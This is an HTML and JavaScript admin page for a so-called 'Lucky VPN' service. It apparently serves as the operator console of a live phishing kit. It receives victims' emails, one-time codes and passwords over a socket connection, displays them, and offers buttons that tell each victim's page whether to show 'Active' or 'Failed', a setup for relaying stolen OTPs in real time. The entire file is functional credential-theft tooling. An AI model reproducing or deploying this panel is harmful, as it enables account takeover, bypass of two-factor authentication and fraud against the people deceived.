<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin - Lucky VPN Control</title>
    <style>
        body { font-family: sans-serif; background: #eef2f3; padding: 30px; }
        .request-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 20px; border-left: 5px solid #007bff; }
        h2 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
        button { padding: 10px 25px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; color: white; margin-right: 10px; }
        .btn-approve { background: #28a745; }
        .btn-reject { background: #dc3545; }
        .data-label { font-weight: bold; color: #555; }
    </style>
</head>
<body>
    <h2>Lucky VPN Live Requests</h2>
    <div id="requests"></div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();

        socket.on('admin_receive_data', (data) => {
            const div = document.createElement('div');
            div.className = 'request-card';
            div.id = 'req-' + data.id;
            
            div.innerHTML = `
                <p><span class="data-label">Type:</span> ${data.type.toUpperCase()}</p>
                <p><span class="data-label">Email/OTP:</span> ${data.email || data.otp || 'N/A'}</p>
                <p><span class="data-label">Password:</span> ${data.pass || 'N/A'}</p>
                <button class="btn-approve" onclick="respond('${data.id}', 'OK')">APPROVE (Show Active)</button>
                <button class="btn-reject" onclick="respond('${data.id}', 'NO')">REJECT (Show Failed)</button>
            `;
            document.getElementById('requests').prepend(div);
            
            // Notification sound
            const bell = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
            bell.play().catch(() => {}); 
        });

        function respond(userId, status) {
            socket.emit('admin_decision', { userId, status });
            alert("Response Sent: " + status);
        }
    </script>
</body>
</html>
